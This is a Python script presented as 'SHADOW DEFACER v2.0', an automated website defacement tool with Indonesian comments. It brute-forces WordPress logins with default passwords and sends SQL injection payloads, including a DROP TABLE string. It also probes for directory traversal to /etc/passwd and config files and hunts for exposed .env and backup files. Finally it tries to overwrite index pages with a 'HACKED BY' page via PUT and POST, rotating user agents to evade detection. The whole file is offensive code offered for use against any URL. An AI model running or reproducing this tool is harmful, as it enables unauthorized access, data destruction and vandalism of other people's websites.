#!/usr/bin/env python3
"""
SHADOW DEFACER v2.0
Universal Auto-Defacer dengan Multi-Vector Attack
Support: WordPress, Joomla, Drupal, Custom CMS, Static HTML
"""

import requests
import os
import sys
import threading
import random
import base64
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import argparse

class ShadowDefacer:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.found_vulnerabilities = []
        self.deface_success = False
        
        # User agents randomization
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
        
        # Default deface page HTML
        self.deface_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>HACKED BY SHADOW DEFACER</title>
            <style>
                body { 
                    background: #000; 
                    color: #0f0; 
                    font-family: Courier; 
                    text-align: center; 
                    margin-top: 20%;
                }
                h1 { color: #f00; font-size: 3em; }
                p { font-size: 1.5em; }
            </style>
        </head>
        <body>
            <h1>HACKED BY SHADOW DEFACER</h1>
            <p>Security is just an illusion</p>
            <p>Your system has been compromised</p>
            <script>
                document.body.innerHTML += '<p>🔓 System Vulnerable</p>';
            </script>
        </body>
        </html>
        """

    def random_headers(self):
        return {'User-Agent': random.choice(self.user_agents)}

    def detect_cms(self):
        """Detect CMS type untuk targeted attack"""
        cms_indicators = {
            'wordpress': ['/wp-admin/', '/wp-content/', '/wp-includes/'],
            'joomla': ['/administrator/', '/media/jui/', '/components/com_'],
            'drupal': ['/sites/default/', '/misc/drupal.js'],
            'magento': ['/skin/frontend/', '/js/mage/'],
            'prestashop': ['/js/tools.js', '/themes/']
        }
        
        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                test_url = self.target_url + indicator
                try:
                    response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                    if response.status_code == 200:
                        print(f"[+] Detected CMS: {cms.upper()}")
                        return cms
                except:
                    continue
        print("[-] CMS not detected, using generic methods")
        return 'generic'

    def wordpress_exploit(self):
        """WordPress specific vulnerabilities"""
        print("[*] Trying WordPress exploits...")
        
        # WP Admin login brute force
        admin_url = self.target_url + "/wp-admin/"
        login_url = self.target_url + "/wp-login.php"
        
        # Common credentials
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('wpadmin', 'wpadmin')
        ]
        
        for username, password in credentials:
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In'
            }
            try:
                response = self.session.post(login_url, data=login_data, headers=self.random_headers())
                if 'dashboard' in response.url:
                    print(f"[+] WordPress Admin Access: {username}:{password}")
                    self.found_vulnerabilities.append(('wordpress_admin', login_url, username, password))
                    return True
            except:
                continue
        return False

    def file_upload_exploit(self):
        """Cari file upload vulnerabilities"""
        print("[*] Scanning for file upload vulnerabilities...")
        
        upload_paths = [
            '/wp-content/plugins/formidable/upload.php',
            '/wp-content/plugins/gravityforms/upload.php',
            '/components/com_media/upload.php',
            '/admin/upload.php',
            '/uploads/upload.php',
            '/inc/upload.php'
        ]
        
        for path in upload_paths:
            test_url = self.target_url + path
            try:
                response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found upload path: {test_url}")
                    self.found_vulnerabilities.append(('file_upload', test_url))
            except:
                continue

    def sql_injection_test(self):
        """Basic SQL injection detection"""
        print("[*] Testing for SQL injection...")
        
        test_params = ['id', 'page', 'category', 'product_id', 'user']
        sql_payloads = ["'", "1' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--"]
        
        for param in test_params:
            for payload in sql_payloads:
                test_url = f"{self.target_url}/?{param}={payload}"
                try:
                    response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                    if 'sql' in response.text.lower() or 'error' in response.text.lower():
                        print(f"[+] Possible SQLi: {test_url}")
                        self.found_vulnerabilities.append(('sqli', test_url))
                        break
                except:
                    continue

    def directory_traversal(self):
        """Directory traversal attack"""
        print("[*] Testing directory traversal...")
        
        traversal_payloads = [
            '../../../../../../etc/passwd',
            '....//....//....//....//windows/win.ini',
            '../wp-config.php',
            '../../configuration.php'
        ]
        
        for payload in traversal_payloads:
            test_url = f"{self.target_url}/?file={payload}"
            try:
                response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                if 'root:' in response.text or '[extensions]' in response.text or 'DB_NAME' in response.text:
                    print(f"[+] Directory Traversal: {test_url}")
                    self.found_vulnerabilities.append(('lfi', test_url))
            except:
                continue

    def backup_file_finder(self):
        """Cari backup files yang bisa diakses"""
        print("[*] Searching for backup files...")
        
        backup_files = [
            '/.bak', '/backup.zip', '/backup.sql',
            '/wp-config.php.bak', '/configuration.php.bak',
            '/index.php.bak', '/admin.php.bak',
            '/.git/config', '/.env', '/config.php'
        ]
        
        for backup in backup_files:
            test_url = self.target_url + backup
            try:
                response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                if response.status_code == 200 and len(response.content) > 0:
                    print(f"[+] Found backup file: {test_url}")
                    self.found_vulnerabilities.append(('backup_file', test_url))
            except:
                continue

    def brute_force_directories(self):
        """Brute force common directories"""
        print("[*] Brute forcing directories...")
        
        common_dirs = [
            '/admin', '/administrator', '/wp-admin', '/cpanel',
            '/uploads', '/images', '/files', '/backup',
            '/inc', '/includes', '/tmp', '/temp'
        ]
        
        for directory in common_dirs:
            test_url = self.target_url + directory
            try:
                response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found directory: {test_url}")
                    self.found_vulnerabilities.append(('directory', test_url))
            except:
                continue

    def deploy_deface(self, file_path=None):
        """Deploy deface page ke berbagai lokasi"""
        print("[*] Deploying deface page...")
        
        deploy_locations = [
            '/index.html', '/index.php', '/default.html',
            '/home.html', '/main.html', '/hacked.html'
        ]
        
        # Jika ada file custom
        if file_path and os.path.exists(file_path):
            with open(file_path, 'r') as f:
                deface_content = f.read()
        else:
            deface_content = self.deface_html
        
        success_count = 0
        
        for location in deploy_locations:
            deploy_url = self.target_url + location
            
            # Try PUT method
            try:
                response = self.session.put(deploy_url, data=deface_content, headers=self.random_headers())
                if response.status_code in [200, 201]:
                    print(f"[+] Deface deployed: {deploy_url}")
                    success_count += 1
            except:
                pass
            
            # Try POST method
            try:
                response = self.session.post(deploy_url, data={'content': deface_content}, headers=self.random_headers())
                if response.status_code == 200:
                    print(f"[+] Deface deployed via POST: {deploy_url}")
                    success_count += 1
            except:
                pass
        
        return success_count > 0

    def mass_deface_attack(self):
        """Multi-vector deface attack"""
        print(f"[*] Starting mass deface attack on: {self.target_url}")
        
        # Run semua exploit bersamaan
        threads = []
        
        exploits = [
            self.detect_cms,
            self.wordpress_exploit,
            self.file_upload_exploit,
            self.sql_injection_test,
            self.directory_traversal,
            self.backup_file_finder,
            self.brute_force_directories
        ]
        
        for exploit in exploits:
            thread = threading.Thread(target=exploit)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Tunggu semua thread selesai
        for thread in threads:
            thread.join(timeout=10)
        
        # Deploy deface page
        self.deface_success = self.deploy_deface()
        
        # Report results
        self.generate_report()

    def generate_report(self):
        """Generate attack report"""
        print("\n" + "="*50)
        print("SHADOW DEFACER - ATTACK REPORT")
        print("="*50)
        
        print(f"Target: {self.target_url}")
        print(f"Deface Success: {self.deface_success}")
        print(f"Vulnerabilities Found: {len(self.found_vulnerabilities)}")
        
        for vuln in self.found_vulnerabilities:
            print(f"  - {vuln[0]}: {vuln[1]}")
        
        if self.deface_success:
            print("\n[+] SUCCESS: Target has been defaced!")
            print(f"[+] Check: {self.target_url}/index.html")
        else:
            print("\n[-] Deface failed. Try manual methods.")

def main():
    parser = argparse.ArgumentParser(description='SHADOW DEFACER v2.0 - Auto Web Defacer')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-f', '--file', help='Custom deface HTML file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    
    args = parser.parse_args()
    
    if not args.url.startswith('http'):
        args.url = 'http://' + args.url
    
    print("""
    ███████ ██   ██  █████  ██████   ██████  ██     ██ 
    ██      ██   ██ ██   ██ ██   ██ ██    ██ ██     ██ 
    ███████ ███████ ███████ ██   ██ ██    ██ ██  █  ██ 
         ██ ██   ██ ██   ██ ██   ██ ██    ██ ██ ███ ██ 
    ███████ ██   ██ ██   ██ ██████   ██████   ███ ███  
    SHADOW DEFACER v2.0 - Universal Web Deface Tool
    """)
    
    defacer = ShadowDefacer(args.url)
    defacer.mass_deface_attack()

if __name__ == "__main__":
    main()
